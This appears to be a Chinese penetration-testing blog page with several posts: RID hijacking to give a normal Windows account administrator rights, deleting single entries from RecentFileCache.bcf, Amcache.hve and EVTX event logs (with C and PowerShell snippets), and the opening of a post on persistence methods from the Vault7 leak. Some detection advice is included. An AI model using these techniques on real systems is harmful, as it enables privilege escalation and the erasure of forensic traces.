<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
#pragma comment(lib,"Advapi32.lib") 

int main(int argc, char *argv[])
{
	HANDLE hEventLog = NULL;

	hEventLog = OpenEventLog(NULL, argv[1]);
	if (NULL == hEventLog)
	{
		printf("OpenEventLog failed with 0x%x.\n", GetLastError());
		goto cleanup;
	}

	DWORD NumberOfRecords = 0;
	BOOL flag = GetNumberOfEventLogRecords(hEventLog, &amp;NumberOfRecords);

	if (NULL == flag)
	{
		printf("GetNumberOfEventLogRecords failed with 0x%x.\n", GetLastError());
		goto cleanup;
	}
	printf("%d\n", NumberOfRecords);

cleanup:

	if (hEventLog)
		CloseEventLog(hEventLog);

}
</code></pre></div></div>

<p>cmd：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetNumberOfEventLogRecords.exe system
</code></pre></div></div>

<p>获得日志个数</p>

<p>通过ProcessHacker直接修改内存文件<code class="language-plaintext highlighter-rouge">File header</code>的<code class="language-plaintext highlighter-rouge">Last (newest) record number</code>和<code class="language-plaintext highlighter-rouge">End of file record</code>的<code class="language-plaintext highlighter-rouge">Last (newest) record number</code></p>

<p>再次执行程序获得日志个数，发现获得的日志个数不变</p>

<p>验证结论，修改内存中的日志内容无法更改实际的日志个数</p>

<h2 id="0x06-日志查询和日志修改的程序实现细节">0x06 日志查询和日志修改的程序实现细节</h2>

<p>日志查询的代码如下：</p>

<p>https://github.com/3gstudent/Eventlogedit-evt–General/blob/master/evtQueryRecordbyGetHandle.cpp</p>

<p>代码实现了遍历日志，显示每个日志的信息</p>

<p>日志修改的代码如下：</p>

<p>https://github.com/3gstudent/Eventlogedit-evt–General/blob/master/evtModifyRecordbyGetHandle.cpp</p>

<p>代码实现了修改指定日志的信息</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了删除当前系统指指定时间段evt日志记录的两种方法:通过Dll注入和通过DuplicateHandle分别获得句柄操作权限，利用该句柄实现日志文件的修改</p>

<p>删除方式不是简单的覆盖，而是完全的删除某段时间的日志，evtx文件的日志删除也可以参考这种方法，只是实现上相对复杂一些，后续会更新evtx的实现代码</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 18, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows帐户的RID Hijacking</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/">《渗透技巧——Windows系统的帐户隐藏》</a>介绍过利用帐户克隆建立隐藏帐户的技巧，是通过复制目标帐户对应注册表项F键的值，使得隐藏帐户获得了相同的权限。</p>

<p>如果换一种思路，将目标帐户对应注册表项F键的部分内容覆盖已有帐户，那么已有帐户能否获得目标帐户的权限呢？</p>

<p>这就是本文将要介绍的方法——RID Hijacking</p>

<p><strong>注：</strong></p>

<p>该方法最早公开于2017年12月，地址如下：</p>

<p>http://csl.com.co/rid-hijacking/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>RID劫持的方法</li>
  <li>编写脚本的实现思路</li>
  <li>利用分析</li>
  <li>防御检测</li>
</ul>

<h2 id="0x02-相关概念">0x02 相关概念</h2>
<hr>

<h3 id="sid">SID</h3>

<p>全称Security Identifiers(安全标识符)，是Windows系统用于唯一标识用户或组的可变长度结构</p>

<p>官方说明地址：</p>

<p>https://msdn.microsoft.com/en-us//library/windows/desktop/aa379594(v=vs.85).aspx</p>

<p>SID包含以下信息：</p>

<ul>
  <li>The revision level of the SID structure</li>
  <li>48-bit identifier authority value</li>
  <li>relative identifier (RID)</li>
</ul>

<h4 id="实例">实例</h4>

<p>Windows命令行执行<code class="language-plaintext highlighter-rouge">whoami /all</code>可获得当前用户的SID，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-1/2-1.png" alt="Alt text"></p>

<p>SID为： <code class="language-plaintext highlighter-rouge">S-1-5-21-2752016420-1571072424-526487797-1001</code></p>

<p>S表示该字符串是SID
1表示SID的版本号
5-21-2752016420-1571072424-526487797对应ID authority
1001表示RID</p>

<h3 id="rid">RID</h3>

<p>Windows系统帐户对应固定的RID：</p>

<ul>
  <li>500： ADMINISTRATOR</li>
  <li>501： GUEST</li>
  <li>502: krbtgt(域环境)</li>
  <li>512: Domain Admins(域环境)</li>
  <li>513: Domain Users(域环境)</li>
  <li>514: Domain Guests(域环境)</li>
  <li>515: Domain Computers(域环境)</li>
  <li>516: Domain Controllers(域环境)</li>
</ul>

<h2 id="0x03-rid劫持方法">0x03 RID劫持方法</h2>
<hr>

<p>对于Windows系统来说，注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>下包含当前系统的所有帐户列表，每个帐户的默认键值对应该帐户详细信息的注册表位置(即RID的十六进制表示)</p>

<p><strong>注：</strong></p>

<p>需要获得system权限才能读取</p>

<p>举例如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-1/3-1.png" alt="Alt text"></p>

<p>帐户a的注册表默认值为<code class="language-plaintext highlighter-rouge">0x3e9</code></p>

<p><strong>注：</strong></p>

<p>帐户a为普通用户权限</p>

<p>详细信息的注册表位置为<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003E9</code></p>

<p>详细信息如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-1/3-2.png" alt="Alt text"></p>

<p>F键的内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-1/3-3.png" alt="Alt text"></p>

<p>偏移位置<code class="language-plaintext highlighter-rouge">0x30f</code>和<code class="language-plaintext highlighter-rouge">0x31f</code>对应RID</p>

<p>由于是litte-endian字节存储，所以上图中从F键获得的RID值为<code class="language-plaintext highlighter-rouge">0x03E9</code>，转换为十进制为<code class="language-plaintext highlighter-rouge">1001</code></p>

<p>使用帐户a登录，执行<code class="language-plaintext highlighter-rouge">whoami /all</code>获得帐户a的SID，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-1/3-4.png" alt="Alt text"></p>

<p>内容相同</p>

<h3 id="测试1-伪造成内置管理员帐户administrator">测试1： 伪造成内置管理员帐户ADMINISTRATOR</h3>

<p>将帐户a的RID修改为500(固定值，表示windows系统内置管理员ADMINISTRATOR)，对应十六进制为<code class="language-plaintext highlighter-rouge">01F4</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-1/3-5.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>帐户a需要重新登录才能生效</p>

<p>登录帐户a，帐户a继承了ADMINISTRATOR的权限，成为了管理员</p>

<p>登录用户名为： 原用户名.机器名，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-1/3-6.png" alt="Alt text"></p>

<p>用户文件夹也随之改变，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-1/3-7.png" alt="Alt text"></p>

<p><strong>直观理解：</strong></p>

<p>帐户a变成了新帐户a.WIN-BH7SVRRDGVA，继承了ADMINISTRATOR的权限</p>

<h3 id="测试2-伪造成管理员帐户1">测试2： 伪造成管理员帐户1</h3>

<p>新建管理员帐户1，RID为1000(0x03e8)，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-1/4-1.png" alt="Alt text"></p>

<p>将帐户a的RID修改为1000(0x03e8)</p>

<p>修改后如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-1/4-2.png" alt="Alt text"></p>

<p>重新登录帐户a</p>

<p>帐户a继承了帐户1的权限，成为了管理员</p>

<p>登录用户名变为1，执行<code class="language-plaintext highlighter-rouge">whoami /all</code>输出的用户名为a，但RID为1000(帐户1的RID)，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-1/4-3.png" alt="Alt text"></p>

<p>环境变量对应为用户1，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-1/4-4.png" alt="Alt text"></p>

<p><strong>直观理解：</strong></p>

<p>帐户a变成了原有帐户1，继承了1的权限，但在部分功能的显示上还保留帐户a</p>

<h2 id="0x04-编写脚本的实现思路">0x04 编写脚本的实现思路</h2>
<hr>

<h3 id="实现思路">实现思路</h3>

<ol>
  <li>获得system权限</li>
  <li>读取指定帐户的注册表信息</li>
  <li>修改固定偏移地址，指定为新的RID</li>
  <li>导入注册表，完成修改</li>
</ol>

<p>具体实现细节上可参考文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/">《渗透技巧——Windows系统的帐户隐藏》</a>中的说明</p>

<p>参考代码：</p>

<p>https://github.com/3gstudent/Windows-User-Clone</p>

<p>由于功能较为简单，因此实现代码留给读者完成</p>

<p>msf对应的实现模块： <code class="language-plaintext highlighter-rouge">windows/manage/rid_hijack</code></p>

<h2 id="0x05-利用分析">0x05 利用分析</h2>
<hr>

<p>对于RID Hijacking，实现原理上很简单： <strong>定位帐户的注册表文件，修改代表RID信息的位置即可</strong></p>

<p>但在利用上存在以下不足：</p>

<ul>
  <li>帐户重新登录才能生效</li>
  <li>环境变量被修改，影响正常使用</li>
  <li>用户名的显示存在问题，容易被发现</li>
  <li>模拟ADMINISTRATOR的权限会新建用户文件夹</li>
</ul>

<h3 id="利用场景">利用场景</h3>

<ol>
  <li>启用帐户guest，修改RID,登录帐户guest，获得高权限</li>
  <li>修改低权限用户RID，登录获得高权限</li>
</ol>

<h2 id="0x06-防御检测">0x06 防御检测</h2>
<hr>

<p>站在防御的角度，攻击者首先需要获得当前系统的system权限</p>

<p>检测思路：</p>

<ul>
  <li>
    <p>查看注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\</code>下的信息是否存在异常</p>
  </li>
  <li>
    <p>帐户guest是否被开启</p>
  </li>
</ul>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了RID Hijacking的实现方法，分析利用条件，给出防御建议</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May  1, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——RecentFileCache.bcf和Amcache.hve单条记录的清除</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96%E4%B8%8E%E6%B8%85%E9%99%A4/">《渗透技巧——Windows系统文件执行记录的获取与清除》</a>对Windows主机(Win7及以上系统)常见文件执行记录的位置进行整理，尝试获取并清除单条记录，分析利用思路，总结防御方法。</p>

<p>本文作为后续，详细介绍RecentFileCache.bcf和Amcache.hve单条记录的清除方法</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<ul>
  <li>RecentFileCache.bcf格式分析</li>
  <li>编写程序实现RecentFileCache.bcf的单条记录清除</li>
  <li>Amcache.hve格式分析</li>
  <li>编写程序实现Amcache.hve的单条记录清除</li>
</ul>

<h2 id="0x02-recentfilecachebcf格式分析">0x02 RecentFileCache.bcf格式分析</h2>
<hr>

<h3 id="简介">简介</h3>

<p>用来跟踪应用程序与不同可执行文件的兼容性问题，能够记录应用程序执行的历史记录</p>

<p>支持Win7(Win8及更高版本的系统不支持)，位置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\AppCompat\Programs\RecentFileCache.bcf
</code></pre></div></div>

<h3 id="格式分析">格式分析</h3>

<p>没有找到介绍RecentFileCache.bcf文件格式的资料，但好在格式的规律比较简单</p>

<p>前20字节为文件头部(header)</p>

<p>前16字节为固定格式，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-7/2-1.png" alt="Alt text"></p>

<p>接下来是每条记录的内容，固定格式如下：</p>

<ul>
  <li>前4字节表示Unicode记录的长度</li>
  <li>记录的内容(Unicode格式)</li>
  <li>结束标志，0x0000</li>
</ul>

<p><strong>注：</strong></p>

<p>Unicode每个字符占用2个字节</p>

<p>下面使用c程序实现RecentFileCache.bcf文件的解析</p>

<p>定义结构体</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _BCF_HEADER {
	ULONG64 Flag1;
	ULONG64 Flag2;
	ULONG Unknown;
} BCFHEADER, *PBCFHEADER;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _BCF_RECORD {
	ULONG Size;
} BCFRECORD, *PBCFRECORD;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>ULONG64为8字节，ULONG为4字节</p>

<p>逐个解析每条记录，通过固定变量Size确定记录长度，进而读取每条记录的内容</p>

<p>完整实现代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/ListRecentFileCache.cpp</p>

<p>代码实现了读取RecentFileCache.bcf文件并显示所有记录</p>

<h2 id="0x03-recentfilecachebcf文件的单条记录清除">0x03 RecentFileCache.bcf文件的单条记录清除</h2>
<hr>

<p>最简单的方法是将待删除的记录用字符<code class="language-plaintext highlighter-rouge">0x00</code>覆盖，但是会打乱原有的文件格式</p>

<p>所以这里需要将待删除的记录内容删除，后续的记录补齐空位</p>

<p>在程序实现上，使用新的数组来存储修改后的内容</p>

<p>完整实现代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/DeleteRecentFileCache.cpp</p>

<p>代码实现了修改指定的RecentFileCache.bcf文件，删除指定的记录，新文件保存为NewRecentFileCache.bcf</p>

<h2 id="0x04-amcachehve格式分析">0x04 Amcache.hve格式分析</h2>
<hr>

<h3 id="简介-1">简介</h3>

<p>Windows系统使用Amcache.hve替换RecentFileCache.bcf，能够记录创建时间、上次修改时间、SHA1和一些PE文件头信息</p>

<p>Win8及更高版本的系统使用Amcache.hve替代RecentFileCache.bcf</p>

<p>Win7安装KB2952664后，也会支持Amcache.hve，也就是说，此时RecentFileCache.bcf和Amcache.hve都包含文件执行记录</p>

<p>Amcache.hve采用注册表格式存储信息</p>

<p>注册表文件的格式可参考：</p>

<p>http://www.sentinelchicken.com/data/TheWindowsNTRegistryFileFormat.pdf</p>

<p>附录部分包括详细的文件格式介绍，可为程序实现提供参考</p>

<p>为了提高开发效率，对记录的解析我们可以借助Windows系统下的regedit.exe</p>

<p>通过regedit.exe加载Amcache.hve，即可查看和修改Amcache.hve的信息，方法如下：</p>

<p>选择<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE</code>，选择<code class="language-plaintext highlighter-rouge">File</code> -&gt; <code class="language-plaintext highlighter-rouge">Load Hive...</code>，指定名称，即可加载Amcache.hve</p>

<p>查看注册表后发现，文件执行记录以明文保存</p>

<p>修改regedit.exe中Amcache.hve的注册表信息，需要使用System权限，修改后再选择Export，即可实现对Amcache.hve的保存</p>

<p>查看Amcache.hve文件记录的开源powershell脚本，地址如下：</p>

<p>https://github.com/yoda66/GetAmCache/blob/master/Get-Amcache.ps1</p>

<p>脚本流程如下：</p>

<ul>
  <li>通过reg load加载Amcache.hve</li>
  <li>枚举注册表，显示记录信息</li>
  <li>通过reg unload卸载Amcache.hve</li>
</ul>

<h2 id="0x05-amcachehve文件的单条记录清除">0x05 Amcache.hve文件的单条记录清除</h2>
<hr>

<h3 id="删除思路">删除思路</h3>

<p>删除指定记录的信息，需要删除该记录对应的注册表父项</p>

<h3 id="删除方法">删除方法</h3>

<h4 id="1通过regeditexe的界面操作">1、通过regedit.exe的界面操作</h4>

<p>以System权限打开regedit.exe，加载Amcache.hve，编辑注册表，最后选择Export导出新的Amcache.hve</p>

<h4 id="2脚本实现">2、脚本实现</h4>

<p>流程如下：</p>

<ul>
  <li>以system权限通过reg load加载Amcache.hve</li>
  <li>枚举注册表，匹配待删除的记录</li>
  <li>获得记录的注册表父项，删除整个注册表键值</li>
  <li>导出注册表，保存Amcache.hve</li>
  <li>通过reg unload卸载Amcache.hve</li>
</ul>

<p>脚本实现的细节：</p>

<p>判断当前权限是不是system：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$output = &amp;"whoami"
if($output -notmatch "nt authority\\system")
{
	Write-Error "Script must be run as nt authority\system" -ErrorAction Stop
}
</code></pre></div></div>

<p>加载注册表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg load HKLM\amcache c:\Windows\AppCompat\Programs\Amcache.hve
</code></pre></div></div>

<p>导出注册表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg.exe save HKLM\amcache "new.hve" /y
</code></pre></div></div>

<p>卸载注册表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg.exe unload HKLM\amcache
</code></pre></div></div>

<p>完整实现代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Powershell/blob/master/Delete-Amcache.ps1</p>

<p>代码实现了删除指定名称的记录，并且能够自动删除多条重复的记录，最终生成新文件new.hve</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了RecentFileCache.bcf和Amcache.hve单条记录的清除方法和程序实现细节。</p>

<p>站在取证的角度，对于RecentFileCache.bcf和Amcache.hve的记录，不能盲目相信</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November  7, 2018
  </div>

  
</article><article class="post">
  <h1>Windows XML Event Log (EVTX)单条日志清除（二）——程序实现删除evtx文件的单条日志记录</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Windows XML Event Log (EVTX)单条日志清除系列文章的第二篇，介绍对指定evtx文件的单条日志删除方法，解决在程序设计上需要考虑的多个问题，开源实现代码。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>对指定evtx文件单条日志的删除思路</li>
  <li>程序实现细节</li>
  <li>开源代码</li>
</ul>

<h2 id="0x02-对指定evtx文件单条日志的删除思路">0x02 对指定evtx文件单条日志的删除思路</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B/">《Windows XML Event Log (EVTX)单条日志清除（一）——删除思路与实例》</a>介绍了evtx日志文件中删除单条日志的原理和一个实例，采用修改日志长度的方法实现日志删除</p>

<p>实现思路如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-2/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>图片来自https://blog.fox-it.com/2017/12/08/detection-and-recovery-of-nsas-covered-up-tracks/</p>

<p>这种方法在实现上相对简单，但是需要考虑多种不同的情况：</p>

<ol>
  <li>删除中间日志</li>
  <li>删除最后一条日志</li>
  <li>删除第一条日志</li>
</ol>

<h2 id="0x03-删除中间日志">0x03 删除中间日志</h2>
<hr>

<p>方法如下：</p>

<ol>
  <li>File header中的Next record identifier值减1</li>
  <li>重新计算File header中的Checksum</li>
  <li>重新计算前一日志长度，共2个位置(偏移4和当前日志的最后4字节)</li>
  <li>后续日志的Event record identifier依次减1</li>
  <li>ElfChuk中的Last event record number减1</li>
  <li>ElfChuk中的Last event record identifier减1</li>
  <li>重新计算ElfChuk中Event records checksum</li>
  <li>重新计算ElfChuk中Checksum</li>
</ol>

<p>在程序实现上，具体细节如下：</p>

<h3 id="1file-header中的next-record-identifier值减1">1、File header中的Next record identifier值减1</h3>

<p>读取日志文件内容</p>

<p>定义日志文件格式结构体，对日志文件格式进行解析</p>

<p>Next record identifier值减1：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FileHeader-&gt;NextRecordIdentifier = FileHeader-&gt;NextRecordIdentifier-1
</code></pre></div></div>

<h3 id="2重新计算file-header中的checksum">2、重新计算File header中的Checksum</h3>

<p>计算CRC校验和的c代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int CRC32[256];
static void init_table()
{
	int i, j;
	unsigned int crc;
	for (i = 0; i &lt; 256; i++)
	{
		crc = i;
		for (j = 0; j &lt; 8; j++)
		{
			if (crc &amp; 1)
				crc = (crc &gt;&gt; 1) ^ 0xEDB88320;
			else
				crc = crc &gt;&gt; 1;
		}
		CRC32[i] = crc;
	}
}

unsigned int GetCRC32(unsigned char *buf, int len)
{
	unsigned int ret = 0xFFFFFFFF;
	int i;
	static char init = 0;
	if (!init)
	{
		init_table();
		init = 1;
	}
	for (i = 0; i &lt; len; i++)
	{
		ret = CRC32[((ret &amp; 0xFF) ^ buf[i])] ^ (ret &gt;&gt; 8);
	}
	ret = ~ret;
	return ret;
}
</code></pre></div></div>

<p>计算File header前120字节的Checksum</p>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned char *ChecksumBuf = new unsigned char[120];
memcpy(ChecksumBuf, (PBYTE)elfFilePtr, 120);
crc32 = GetCRC32(ChecksumBuf, 120);
</code></pre></div></div>

<h3 id="3重新计算前一日志长度共2个位置偏移4和当前日志的最后4字节">3、重新计算前一日志长度，共2个位置(偏移4和当前日志的最后4字节)</h3>

<p>通过搜索magic string <code class="language-plaintext highlighter-rouge">0x2A 0x2A 0x00 0x00</code>逐个定位Event Record</p>

<p>(1)定位待删除的日志CurrentRecord</p>

<p>读取长度，即CurrentRecord-&gt;Size</p>

<p>(2) 定位前一日志PrevRecord</p>

<p>读取长度，即PrevRecord-&gt;Size</p>

<p>计算合并后的长度：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NewSize = CurrentRecord-&gt;Size + PrevRecord-&gt;Size
</code></pre></div></div>

<p>更新长度：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PrevRecord-&gt;Size = NewSize
</code></pre></div></div>

<p>(3) 定位后一日志NextRecord</p>

<p>使用NewSize替换NextRecord起始点前的4字节：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*(PULONG)((PBYTE)NextRecord-4) = NewSize
</code></pre></div></div>

<h3 id="4后续日志的event-record-identifier依次减1">4、后续日志的Event record identifier依次减1</h3>

<p>遍历后续日志，Event record identifier依次减1</p>

<p>需要修改两个位置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CurrentRecord-&gt;EventRecordIdentifier = CurrentRecord-&gt;EventRecordIdentifier-1 
CurrentRecord-&gt;Template-&gt;EventRecordIdentifier = CurrentRecord-&gt;Template-&gt;EventRecordIdentifier-1
</code></pre></div></div>

<h3 id="5elfchuk中的last-event-record-number减1">5、ElfChuk中的Last event record number减1</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ElfChuk-&gt;LastEventRecordNumber = ElfChuk-&gt;LastEventRecordNumber-1
</code></pre></div></div>

<h3 id="6-elfchuk中的last-event-record-identifier减1">6、 ElfChuk中的Last event record identifier减1</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ElfChuk-&gt;LastEventRecordIdentifier = ElfChuk-&gt;LastEventRecordIdentifier-1
</code></pre></div></div>

<h3 id="7重新计算elfchuk中event-records-checksum">7、重新计算ElfChuk中Event records checksum</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned char *ChecksumBuf = new unsigned char[currentChunk-&gt;FreeSpaceOffset - 512];		
memcpy(ChecksumBuf, (PBYTE)currentChunk+512, currentChunk-&gt;FreeSpaceOffset - 512);
crc32 = GetCRC32(ChecksumBuf, currentChunk-&gt;FreeSpaceOffset - 512);
</code></pre></div></div>

<h3 id="8-重新计算elfchuk中checksum">8、 重新计算ElfChuk中Checksum</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned char *ChecksumBuf = new unsigned char[504];
memcpy(ChecksumBuf, (PBYTE)currentChunk, 120);
memcpy(ChecksumBuf+120, (PBYTE)currentChunk+128, 384);
crc32 = GetCRC32(ChecksumBuf, 504);
</code></pre></div></div>

<h2 id="0x04-删除最后一条日志">0x04 删除最后一条日志</h2>
<hr>

<p>删除最后一条日志在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B/">《Windows XML Event Log (EVTX)单条日志清除（一）——删除思路与实例》</a>做过实例演示，与删除中间日志的方法基本相同</p>

<p>区别如下：</p>

<ol>
  <li>后续日志的Event record identifier不需要减1，因为没有后续日志</li>
  <li>需要重新计算ElfChuk中的Last event record data offset</li>
</ol>

<p>程序细节如下：</p>

<p>1、重新计算ElfChuk中的Last event record data offset</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ElfChuk-&gt;LastEventRecordDataOffset = ElfChuk-&gt;LastEventRecordDataOffset-LastRecord-&gt;Size
</code></pre></div></div>

<h2 id="0x05-删除第一条日志">0x05 删除第一条日志</h2>
<hr>

<p>修改日志长度的方法不适用于删除第一条日志，因为没有前一个日志覆盖当前日志</p>

<p>如果想要依旧使用覆盖长度的方法实现，需要对日志的文件格式做进一步分析</p>

<p>我们知道，Event Record的内容以Binary XML格式保存</p>

<p>Binary XML格式可参考：</p>

<p>https://github.com/libyal/libevtx/blob/master/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#4-binary-xml</p>

<p>通过修改Binary XML格式的内容实现合并日志，需要修改以下内容：</p>

<ul>
  <li>Written date and time</li>
  <li>Template definition Data size</li>
  <li>Next template definition offset</li>
</ul>

<p><strong>注：</strong></p>

<p>该方法同样适用于修改中间日志和最后一条日志，所以说，只要理解了日志格式，删除的方法不唯一</p>

<p>其他实现的细节见开源代码，地址如下：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/DeleteRecordofFile.cpp</p>

<p>代码实现了读取指定日志文件<code class="language-plaintext highlighter-rouge">c:\\test\\Setup.evtx</code>，删除单条日志(EventRecordID=14)，并保存为新的日志文件<code class="language-plaintext highlighter-rouge">c:\\test\\SetupNew.evtx</code></p>

<p><strong>注：</strong></p>

<p>在代码的实现细节上我参考了看雪上的Demo代码，地址如下：</p>

<p>https://bbs.pediy.com/thread-219313.htm</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了删除evtx文件单条日志记录的思路和程序实现细节，开源代码。删除单条日志记录的方法不唯一。接下来将会介绍删除当前系统单条日志记录的多个方法。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June  2, 2018
  </div>

  
</article><article class="post">
  <h1>CIA Vault7 RDB中的Windows后门利用方法分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%BA%90%E4%BB%A3%E7%A0%81%E8%8E%B7%E5%8F%96%E4%B8%8E%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/">《CIA Hive测试指南——源代码获取与简要分析》</a>对维基解密公布的代号为<code class="language-plaintext highlighter-rouge">Vault 8</code>的文档进行了研究，简要分析服务器远程控制工具<code class="language-plaintext highlighter-rouge">Hive</code></p>

<p>本文将要继续对维基解密公布的CIA相关资料进行分析，介绍<code class="language-plaintext highlighter-rouge">Vault 7</code>中<code class="language-plaintext highlighter-rouge">Remote Development Branch (RDB)</code>中提到的Windows后门利用方法</p>

<p>资料地址：</p>

<p>https://wikileaks.org/ciav7p1/cms/page_2621760.html</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要分析以下后门利用方法：</p>

<ul>
  <li>VBR Persistence</li>
  <li>Image File Execution Options</li>
  <li>OCI.DLL Service Persistence</li>
  <li>Shell Extension Persistence</li>
  <li>Windows FAX DLL Injection</li>
</ul>

<h2 id="0x02-vbr-persistence">0x02 VBR Persistence</h2>
<hr>

<p>用于在Windows系统的启动过程中执行后门，能够hook内核代码</p>

